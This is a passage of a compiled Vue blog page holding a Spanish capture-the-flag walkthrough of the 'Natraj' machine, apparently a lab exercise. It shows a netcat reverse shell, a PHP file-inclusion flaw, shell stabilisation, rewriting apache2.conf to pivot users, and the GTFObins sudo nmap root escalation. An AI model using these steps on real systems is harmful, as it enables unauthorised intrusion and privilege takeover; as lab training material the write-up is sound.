  }, [_c('code', [_vm._v("❯ nc -nlvp 443\nlistening on [any] 443 ...\nconnect to [192.168.0.24] from (UNKNOWN) [192.168.0.23] 39602\nbash: cannot set terminal process group (580): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@ubuntu:/var/www/html/console$ cd\ncd\nbash: cd: HOME not set\nwww-data@ubuntu:/var/www/html/console$ ls\nls\nfile.php\nwww-data@ubuntu:/var/www/html/console$ cat file php\ncat file php\ncat: file: No such file or directory\ncat: php: No such file or directory\nwww-data@ubuntu:/var/www/html/console$ cat file.php\ncat file.php\n<?php\n   $file = $_GET['file'];\n   if(isset($file))\n   {\n       include(\"$file\");\n   }\n   else\n   {\n       include(\"index.php\");\n   }\n   ?>\nwww-data@ubuntu:/var/www/html/console$ \n")])])]), _c('h2', {
    attrs: {
      "id": "tratamiento-de-la-tty"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#tratamiento-de-la-tty"
    }
  }, [_vm._v("#")]), _vm._v(" Tratamiento de la TTY")]), _vm._v(" "), _c('p', [_vm._v("procedemos a hacer un tratamiento de la TTY para tener una consola aun más interactiva\nen la maquina victima")]), _vm._v(" "), _c('div', {
    staticClass: "language-ini extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-ini"
    }
  }, [_c('code', [_vm._v("script /dev/null -c bash\n")])])]), _c('p', [_vm._v("precionamos Ctrl + z para suspender el proceso\ny en nuestramaquina colocamos el siguiente comando")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_vm._v("stty raw -echo"), _c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v(";")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("fg")]), _vm._v("\n")])])]), _c('p', [_vm._v("lo que nos permite retomar el proceso\npero ahora escribimos "), _c('code', [_vm._v("reset")]), _vm._v(" para reiniciar la terminal de la maquina victima y procedemos a preparara para hacerlo más comodo")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token builtin class-name"
    }
  }, [_vm._v("export")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token assign-left variable"
    }
  }, [_c('span', {
    pre: true,
    attrs: {
      "class": "token environment constant"
    }
  }, [_vm._v("TERM")])]), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_vm._v("=")]), _vm._v("xterm\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token builtin class-name"
    }
  }, [_vm._v("export")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token assign-left variable"
    }
  }, [_c('span', {
    pre: true,
    attrs: {
      "class": "token environment constant"
    }
  }, [_vm._v("SHELL")])]), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_vm._v("=")]), _vm._v("bash\n")])])]), _c('p', [_vm._v("y ajustamos la resulución de la terminal de la siguiente manera:")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_vm._v("stty rows XX columns XXX\n")])])]), _c('blockquote', [_c('p', [_vm._v("para conocer las dimenciones de tu terminal puedes digitar "), _c('code', [_vm._v("stty size")]), _vm._v(" "), _c('img', {
    attrs: {
      "src": __webpack_require__(322),
      "alt": "stty size"
    }
  })])]), _vm._v(" "), _c('p', [_vm._v("ahora tenemos una terminal más interactiva:\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(323),
      "alt": "Maquina victima"
    }
  })]), _vm._v(" "), _c('h2', {
    attrs: {
      "id": "escalada-de-privilegios"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#escalada-de-privilegios"
    }
  }, [_vm._v("#")]), _vm._v(" Escalada de privilegios")]), _vm._v(" "), _c('h3', {
    attrs: {
      "id": "user-pivoting"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#user-pivoting"
    }
  }, [_vm._v("#")]), _vm._v(" User pivoting")]), _vm._v(" "), _c('p', [_vm._v("dentro del servidor, buscamos los archivos a los que tengamos capacidad de escritura:")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("find")]), _vm._v(" / "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("-writable")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_c('span', {
    pre: true,
    attrs: {
      "class": "token file-descriptor important"
    }
  }, [_vm._v("2")]), _vm._v(">")]), _vm._v("/dev/null\n")])])]), _c('p', [_vm._v("viendo que algo interesante está en la siguiente ruta")]), _vm._v(" "), _c('div', {
    staticClass: "language- extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-text"
    }
  }, [_c('code', [_vm._v("/etc/apache2/apache2.conf\n")])])]), _c('p', [_vm._v("lo abrimos con nano y editamos el archivo para que el cuando se reinicie la maquina, el servicio corra como uno de los usuarios que se encuentra en el servidor\nantes:")]), _vm._v(" "), _c('div', {
    staticClass: "language-ini extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-ini"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token section"
    }
  }, [_c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("[")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token section-name selector"
    }
  }, [_vm._v("----mucho texto---")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("]")])]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("# KeepAliveTimeout: Number of seconds to wait for the next request from the")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("# same client on the same connection.")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("#")]), _vm._v("\nKeepAliveTimeout 5\n\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("# These need to be set in /etc/apache2/envvars")]), _vm._v("\nUser ${APACHE_RUN_USER}\nGroup ${APACHE_RUN_GROUP}\n\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("#")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("# HostnameLookups: Log the names of clients or just their IP addresses")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("# e.g., www.apache.org (on) or 204.62.129.132 (off).")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token section"
    }
  }, [_c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("[")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token section-name selector"
    }
  }, [_vm._v("----mas texto---")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("]")])]), _vm._v("\n")])])]), _c('p', [_vm._v("editado:")]), _vm._v(" "), _c('div', {
    staticClass: "language-ini extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-ini"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token section"
    }
  }, [_c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("[")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token section-name selector"
    }
  }, [_vm._v("----mucho texto---")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("]")])]), _vm._v("\nKeepAliveTimeout 5\n\n\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("# These need to be set in /etc/apache2/envvars")]), _vm._v("\nUser mahakal\nGroup mahakal\n\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("#")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("# HostnameLookups: Log the names of clients or just their IP addresses")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token comment"
    }
  }, [_vm._v("# e.g., www.apache.org (on) or 204.62.129.132 (off).")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token section"
    }
  }, [_c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("[")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token section-name selector"
    }
  }, [_vm._v("----mas texto---")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token punctuation"
    }
  }, [_vm._v("]")])]), _vm._v("\n")])])]), _c('p', [_vm._v("ahora reiniciamos la maquina de la forma más realista posible...")]), _vm._v(" "), _c('p', [_vm._v("ahora vemos como corre el servicio http\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(324),
      "alt": "User pivoting"
    }
  })]), _vm._v(" "), _c('p', [_vm._v("por lo que al ingresar con una reverse shell, será como ese usuario\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(325),
      "alt": "Segunda reverse shell"
    }
  })]), _vm._v(" "), _c('h3', {
    attrs: {
      "id": "escalando-a-superusuario"
    }
  }, [_c('a', {
    staticClass: "header-anchor",
    attrs: {
      "href": "#escalando-a-superusuario"
    }
  }, [_vm._v("#")]), _vm._v(" Escalando a superusuario")]), _vm._v(" "), _c('p', [_vm._v("verificamos los permisos que tenemos mediante "), _c('code', [_vm._v("sudo -l")]), _vm._v(" "), _c('img', {
    attrs: {
      "src": __webpack_require__(326),
      "alt": "Permisos como sudo"
    }
  })]), _vm._v(" "), _c('p', [_vm._v("vemos que podemos ejecutar nmap como sudo, por lo que utilizando la guia de GTFobins vemos como escalar privilegios como supe usuario de la siguiente manera:")]), _vm._v(" "), _c('div', {
    staticClass: "language-bash extra-class"
  }, [_c('pre', {
    pre: true,
    attrs: {
      "class": "language-bash"
    }
  }, [_c('code', [_c('span', {
    pre: true,
    attrs: {
      "class": "token assign-left variable"
    }
  }, [_vm._v("TF")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_vm._v("=")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token variable"
    }
  }, [_c('span', {
    pre: true,
    attrs: {
      "class": "token variable"
    }
  }, [_vm._v("$(")]), _vm._v("mktemp"), _c('span', {
    pre: true,
    attrs: {
      "class": "token variable"
    }
  }, [_vm._v(")")])]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token builtin class-name"
    }
  }, [_vm._v("echo")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token string"
    }
  }, [_vm._v("'os.execute(\"/bin/sh\")'")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_vm._v(">")]), _vm._v(" "), _c('span', {
    pre: true,
    attrs: {
      "class": "token variable"
    }
  }, [_vm._v("$TF")]), _vm._v("\n"), _c('span', {
    pre: true,
    attrs: {
      "class": "token function"
    }
  }, [_vm._v("sudo")]), _vm._v(" nmap "), _c('span', {
    pre: true,
    attrs: {
      "class": "token parameter variable"
    }
  }, [_vm._v("--script")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token operator"
    }
  }, [_vm._v("=")]), _c('span', {
    pre: true,
    attrs: {
      "class": "token variable"
    }
  }, [_vm._v("$TF")]), _vm._v("\n")])])]), _c('blockquote', [_c('p', [_vm._v("Fuente https://gtfobins.github.io/gtfobins/nmap/#shell")])]), _vm._v(" "), _c('p', [_c('img', {
    attrs: {
      "src": __webpack_require__(327),
      "alt": "Escalada de privilegios"
    }
  })]), _vm._v(" "), _c('p', [_vm._v("ahora buscamos la flag y la maquina estaria totalmente vulnerada:\n"), _c('img', {
    attrs: {
      "src": __webpack_require__(328),
      "alt": "Flag de root"
    }
  })]), _vm._v(" "), _c('blockquote', [_c('p', [_vm._v("medio confuso que no se vea lo que uno está escribiendo y que los saltos de linea sean en horizontal pero es posible todavía poder utilizar algunos atajos de teclado para mejor presentación")])]), _vm._v(" "), _c('p', [_c('img', {
    attrs: {
      "src": __webpack_require__(329),
      "alt": "Final"
    }
  })])]);
};
var staticRenderFns = [];

// CONCATENATED MODULE: ./blog/_posts/2024_13_05_guide/Natraj.md?vue&type=template&id=3f270615

// EXTERNAL MODULE: ./node_modules/vue-loader/lib/runtime/componentNormalizer.js
var componentNormalizer = __webpack_require__(4);

// CONCATENATED MODULE: ./blog/_posts/2024_13_05_guide/Natraj.md

var script = {}


/* normalize component */

var component = Object(componentNormalizer["a" /* default */])(
  script,
  render,
  staticRenderFns,
  false,
  null,
  null,
  null
  
)

/* harmony default export */ var Natraj = __webpack_exports__["default"] = (component.exports);

/***/ })

}]);